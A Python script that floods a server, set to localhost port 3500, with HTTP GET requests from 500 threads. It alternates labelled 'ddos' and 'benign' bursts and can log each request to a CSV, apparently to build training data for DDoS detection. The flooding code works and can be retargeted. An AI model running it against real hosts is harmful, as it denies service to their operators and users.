import random
import sys
import os
import time
import socket
import threading
import csv
from typing import List
from queue import Queue

DDOS_RATIO = 1
writeToFile = False
targetIP = "127.0.0.1"
targetPort = 3500
numThreads = 500
queue = Queue()


def generateRandomIP() -> str:
    """Generate a random IP address"""
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))


def readIPsFromFile() -> List[str]:
    """Read a list of IPs from a file ./ips.txt"""
    fileIPs = []
    relativeFilePath = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ips.txt")

    with open(relativeFilePath, "r") as f:
        for line in f:
            fileIPs.append(line.strip())
        if len(fileIPs) == 0:
            print("No IPs found in file ips.txt")
            sys.exit(0)
        return fileIPs


ddosIPs = readIPsFromFile()
_isRunning = True
_threads = []
_ddosPacketsSent = 0
_benignPacketsSent = 0
_threadLock = threading.Lock()
_startTime = time.time()


def ddos():
    while _isRunning:
        ddosIP = ddosIPs[random.randint(0, len(ddosIPs) - 1)]
        slug = str(random.randint(0, 100))
        payload = (f"GET /{slug} HTTP/1.1\r\nHost: {ddosIP}\r\n\r\n").encode()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((targetIP, targetPort))
            s.sendto(payload, (targetIP, targetPort))
            s.close()
        except Exception:
            pass

        with _threadLock:
            global _ddosPacketsSent
            _ddosPacketsSent += 1
            if writeToFile:
                with open("./data.csv", "a", newline="") as file:
                    fileWriter = csv.writer(file)
                    fileWriter.writerow(
                        [time.time(), ddosIP, targetIP, random.randint(50000, 55000),
                         targetPort, len(payload),
                         _ddosPacketsSent / (time.time() - _startTime),
                         1])


def startDDOS():
    for _ in range(numThreads):
        thread = threading.Thread(target=ddos)
        _threads.append(thread)
        thread.daemon = True
        thread.start()


def benign():
    while _isRunning:
        ip = "127.0.0.1"  # generateRandomIP()
        slug = str(random.randint(1000, 9999))*4000
        payload = (f"GET /{slug} HTTP/1.1\r\nHost: {ip}\r\n\r\n").encode()
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((targetIP, targetPort))
            s.sendto(
                payload, (targetIP, targetPort))
            s.close()
        except Exception:
            pass
        with _threadLock:
            global _benignPacketsSent
            _benignPacketsSent += 1
            if writeToFile:
                with open("./data.csv", "a", newline="") as file:
                    fileWriter = csv.writer(file)
                    fileWriter.writerow(
                        [time.time(), ip, targetIP, random.randint(64000, 65000),
                         targetPort, len(payload),
                         _benignPacketsSent / (time.time() - _startTime),
                         0])


def startBenign():
    for _ in range(numThreads):
        thread = threading.Thread(target=benign)
        _threads.append(thread)
        thread.daemon = True
        thread.start()


if __name__ == "__main__":
    try:
        if writeToFile:
            with open("./data.csv", "w", newline="") as file:
                fileWriter = csv.writer(file)
                fileWriter.writerow(["time", "src_ip", "dst_ip", "src_port", "dest_port",
                                    "pkt_len", "pkts_per_sec", "is_ddos"])
        print("Press Ctrl+C to stop program")

        # Randomly choose benign or ddos attack and run for some time then choose randomly again
        while True:
            r = random.random()
            if r <= DDOS_RATIO:
                secondsToRun = random.randint(1, 10)
                print(f"Starting ddos attack for {secondsToRun} seconds")
                startDDOS()
            else:
                secondsToRun = random.randint(1, 4)
                print(f"Starting benign packets for {secondsToRun} seconds")
                startBenign()
            time.sleep(secondsToRun)
            _isRunning = False
            for thread in _threads:
                thread.join()
            _isRunning = True
    except KeyboardInterrupt:
        print("Stopping attack...")
        _isRunning = False
        for thread in _threads:
            thread.join()
        sys.exit(0)
